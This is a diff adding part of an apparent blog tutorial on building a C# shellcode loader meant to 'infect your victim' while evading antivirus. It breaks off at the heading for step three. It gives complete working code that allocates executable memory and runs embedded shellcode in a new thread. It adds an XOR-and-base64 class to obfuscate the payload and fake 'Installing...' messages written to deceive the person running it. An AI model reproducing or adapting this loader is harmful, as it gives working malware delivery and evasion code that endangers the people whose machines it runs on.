@@ -89,3 +89,100 @@ byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
 You now have your payload and it's time to infect your victim! Except, oh wait! How do we execute it? Most methods of executing these bytes are detected by every antivirus under the sun! Head to step two to find out how to use this payload you created!  
 
 **Step 2: Creating the Loader**  
+Now that we have the payload.cs, it's time to use it! Boot up your favorite IDE and create a new .NET Framework  Console project. I'm using Visual Studio for mine...
+
+Paste in the following code into your **main function**:
+```csharp
+            Console.Title = "Installing Project!"; // Fake them out
+            Console.WriteLine("Installing..."); // Fake them out
+            string announcements_enc = dcb.get("", false);
+            string[] announcements = announcements_enc.Split(',');
+            byte[] f_announcements = new byte[announcements.Length];
+            for (int i = 0; i < announcements.Length; i++)
+            {
+                f_announcements[i] = Convert.ToByte(announcements[i], 16);
+            }
+            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)f_announcements.Length, 0x1000, 0x40);
+            Marshal.Copy(f_announcements, 0x0000, (IntPtr)(funcAddr), f_announcements.Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0x0000;
+            IntPtr pinfo = IntPtr.Zero;
+            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
+            WaitForSingleObject(hThread, 0xffffffff);
+            Console.WriteLine("Done!"); // Gottem
+```  
+then paste the following AFTER your **main** function:
+```csharp
+        [DllImport("kernel32")]
+
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+        [DllImport("kernel32")]
+
+        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
+
+        [DllImport("kernel32")]
+
+        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+```  
+Next you will need to add another C# class...
+**dcb.cs**  
+```csharp
+ internal class dcb
+    {
+        public static string get(string one, bool i)
+        {
+            if (i)
+            {
+                return BE(Ehd(one));
+            }
+            else
+            {
+                return (Ehd(BD(one)));
+            }
+        }
+
+        private static string Ehd(string one)
+        {
+            int two = CHANGEMETOARANDOMNUMBER; // ex. 203948
+            StringBuilder szIn = new StringBuilder(one);
+            StringBuilder szOut = new StringBuilder(one.Length);
+            char Textch;
+            for (int iCount = 0; iCount < one.Length; iCount++)
+            {
+                Textch = szIn[iCount];
+                Textch = (char)(Textch ^ two);
+                szOut.Append(Textch);
+            }
+            return szOut.ToString();
+        }
+
+        private static string BE(string one)
+        {
+            var p = System.Text.Encoding.UTF8.GetBytes(one);
+            return System.Convert.ToBase64String(p);
+
+        }
+        public static string BD(string one)
+        {
+            var b = System.Convert.FromBase64String(one);
+            return System.Text.Encoding.UTF8.GetString(b);
+        }
+    }
+```  
+Make sure you change CHANGEMETOARANDOMNUMBER to a random number.  
+Next you need to paste your payload into the line:
+```csharp
+string announcements_enc = dcb.get("PAYLOAD", false);
+```  
+and change the line to:
+```csharp
+Console.WriteLine(dcb.get("PAYLOAD", true));
+```  
+to see what the encrypted payload is. You also need to comment out the rest of your code to see something like this:
+<img src="https://char2int.com/assets/images/6-30-23/image04.webp" alt="image04">  
+Copy the output to where you had put your payload originally, uncomment your commented code, and revert the Console.WriteLine line back to string anncouncements_enc:  
+<img src="https://char2int.com/assets/images/6-30-23/image05.webp" alt="image05">  
+Now that all of our coding is done, it's time for the fun to begin!  
+
+**Step 3: Execution**  
